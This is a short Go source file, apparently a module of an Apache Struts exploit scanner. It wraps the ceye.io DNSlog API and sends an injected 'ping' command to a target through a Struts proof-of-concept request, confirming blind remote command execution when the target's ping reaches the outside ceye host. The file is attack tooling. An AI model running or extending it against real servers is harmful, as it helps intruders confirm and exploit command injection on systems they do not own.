package main

import (
	"errors"
	"fmt"
	"github.com/imroc/req/v3"
	"strings"
)

type Ceye struct {
	token, types, filter, url string
}

func newCeye(token, types, filter string) *Ceye {
	return &Ceye{
		token:  token,
		types:  types,
		filter: filter,
	}
}

func (c *Ceye) getApiInfo(client *req.Client) (bool, error) {
	c.url = fmt.Sprintf("http://api.ceye.io/v1/records?token=%s&type=%s&filter=%s", c.token, c.types, c.filter)
	resp, err := client.R().Get(c.url)

	if err != nil {
		return false, err
	}
	if strings.Contains(resp.String(), c.filter) {
		return true, nil
	}
	return false, nil
}

func (c *Ceye) pingCeye(client *req.Client, hdrs map[string]string, element, pocUrl, strutsNo, sysType string) error {
	switch sysType {
	case "windows":
		order := "ping " + c.filter
		_, err := postUrl(client, hdrs, element, order, pocUrl, strutsNo)
		if err != nil {
			return err
		}
	case "linux":
		order := "ping -c 4 " + c.filter
		_, err := postUrl(client, hdrs, element, order, pocUrl, strutsNo)
		if err != nil {
			return err
		}
	default:
		err := errors.New("os input err")
		return err
	}
	return nil
}
